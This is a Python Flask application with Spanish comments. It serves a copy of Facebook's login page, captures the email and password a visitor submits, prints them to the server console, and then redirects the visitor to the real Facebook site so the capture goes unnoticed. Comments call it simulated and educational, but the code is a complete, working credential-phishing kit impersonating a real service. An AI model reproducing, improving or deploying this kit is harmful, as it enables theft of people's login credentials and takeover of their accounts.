from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# Plantilla HTML para simular la página de inicio de sesión de Facebook
login_page = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión o regístrate</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 70%;  /* Hacemos la imagen más responsiva */
            max-width: 250px;  /* Limite máximo de tamaño para pantallas grandes */
            height: auto;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            font-size: 16px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #165db3;
        }
        .link {
            margin-top: 10px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }
        .link:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: gray;
        }

        /* Estilo adicional para pantallas más pequeñas */
        @media (max-width: 600px) {
            .container {
                width: 90%;
                padding: 15px;
            }
            input[type="text"], input[type="password"], input[type="submit"] {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="/static/facebook-logo.png" alt="Facebook">
        </div>
        <form method="POST" action="/submit">
            <div class="form-group">
                <label for="email">Correo electrónico o teléfono</label>
                <input type="text" id="email" name="email" placeholder="Correo electrónico o teléfono" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            <input type="submit" value="Iniciar sesión">
        </form>
        <a class="link" href="#">¿Olvidaste tu contraseña?</a>
        <div class="footer">
            <p>Crea una página para una celebridad, una marca o un negocio.</p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def login():
    # Mostrar la página de inicio de sesión simulada
    return render_template_string(login_page)

@app.route('/submit', methods=['POST'])
def submit():
    # Obtener los datos enviados (simulados, no reales)
    email = request.form.get('email')
    password = request.form.get('password')

    # Aquí, en un entorno controlado, se registra para educación
    print(f"Correo: {email}, Contraseña: {password}")

    # Redirigir al usuario a la página oficial de Facebook
    return redirect("https://www.facebook.com/")

if __name__ == '__main__':
    app.run(debug=True)
